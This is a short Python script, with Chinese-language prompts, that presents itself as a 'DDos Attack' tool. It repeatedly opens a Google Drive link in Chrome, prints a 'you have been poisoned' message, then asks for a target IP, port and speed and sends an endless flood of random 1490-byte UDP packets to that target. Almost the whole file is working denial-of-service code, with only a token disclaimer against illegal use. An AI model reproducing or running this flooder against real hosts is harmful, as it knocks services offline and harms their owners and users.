import webbrowser,time,sys,os,socket,random
while True:
    urL='https://drive.google.com/file/d/1EVcYWOzKNYWaxTpLfkvg863dFoEmz1aO/view?usp=share_link'#彩蛋
    chrome_path="C:\Program Files\Google\Chrome\Application\chrome.exe"
    webbrowser.register('chrome', None,webbrowser.BackgroundBrowser(chrome_path))
    webbrowser.get('chrome').open_new(urL)
    time.sleep(3)
    print("你被夢幻小可中毒了!!!")
    time.sleep(3)
    
    from datetime import datetime
    now = datetime.now()
    hour = now.hour
    minute = now.minute
    day = now.day
    month = now.month
    year = now.year

    ##############
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    #############

    os.system("clear")
    os.system("figlet DDos Attack")
    print (" ")
    print ("/---------------------------------------------------\ ")
    print ("|   作者          : siesta                       |")
    print ("|   kali-QQ學習群 : https://discord.gg/aJX5RMmuVS                      |")
    print ("|   版本          : V6.9                          |")
    print ("\---------------------------------------------------/")
    print (" ")
    print (" -----------------[請勿用於違法用途]----------------- ")
    print (" ")
    ip = input("請輸入 IP     : ")
    port = int(input("攻擊端口      : "))
    sd = int(input("攻擊速度(1~1000) : "))

    os.system("clear")

    sent = 0
    while True:
         sock.sendto(bytes, (ip,port))
         sent = sent + 1
         print ("已發送 %s 個數據包到 %s 端口 %d"%(sent,ip,port))
         time.sleep((1000-sd)/2000)